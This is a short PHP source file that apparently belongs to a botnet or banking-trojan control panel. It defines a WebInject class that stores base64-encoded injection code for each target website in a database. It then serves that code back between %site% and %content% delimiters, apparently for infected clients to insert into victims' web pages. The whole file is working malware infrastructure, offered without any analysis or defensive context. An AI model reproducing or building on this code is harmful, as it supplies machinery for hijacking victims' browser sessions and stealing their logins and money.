<?php
class WebInject{
    
    static function add_inject(){
        if(isset($_POST['inject'])){
            $webinject_site = $_POST['site'];
            $webinject_code = $_POST['webinject'];
            if(isset($webinject_code) && $webinject_code != '' && isset($webinject_site) && $webinject_site != ''){
                global $bdd;
                
                $base64 = base64_encode($webinject_code);
                $select = $bdd->prepare("SELECT * FROM webinject WHERE webinject_site  = :site");
                $select->bindParam(':site', $webinject_site);
                $select->execute();
                if($select->rowCount() < 1){
                    $insert = $bdd->prepare("INSERT INTO webinject(webinject_site, webinject_code) VALUES(:site, :code)");
                    $insert->bindParam(':site', $webinject_site);
                    $insert->bindParam(':code', $base64);
                    $insert->execute();
                    echo "Inject inserted";
                }
                else{
                    echo "This inject already exists";
                }
            }
        }
    }
    
    static function show_inject($id = NULL){
        if($id != NULL){
            global $bdd;
            $select = $bdd->prepare("SELECT * FROM webinject WHERE webinject_site = :id");
            $select->bindParam(':id', $id);
            $select->execute();
            if($select->rowCount() > 0){
                $fetch = $select->fetch();
                echo "%site%".$fetch['webinject_site']."%site%";
                echo "%content%".base64_decode($fetch['webinject_code'])."%content%";
            }
            else{
                echo "[Not found]";
            }
        }
    }
}